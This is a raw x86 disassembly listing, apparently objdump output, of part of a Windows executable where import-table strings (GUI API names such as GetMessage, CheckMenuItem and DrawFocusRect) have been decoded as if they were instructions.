  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
